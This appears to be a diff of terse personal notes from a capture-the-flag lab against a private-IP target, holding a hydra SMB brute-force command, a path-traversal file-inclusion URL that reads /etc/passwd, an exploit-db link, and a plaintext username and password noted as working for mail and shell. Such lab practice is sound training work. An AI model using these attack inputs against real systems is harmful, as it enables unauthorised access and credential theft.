@@ -13,7 +13,8 @@ hydra -l skynet -P Downloads/skynet.txt [target_ip] smb -V -f
 
 works http://10.113.130.138/squirrelmail/
 CVE 2025 30090
- 
+
+
 milesdyson
 cyborg007haloterminator
 
@@ -57,3 +58,9 @@ https://www.exploit-db.com/exploits/25971
 
 
 http://10.113.130.138/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+
+
+milesdyson
+cyborg007haloterminator
+
+on shell also
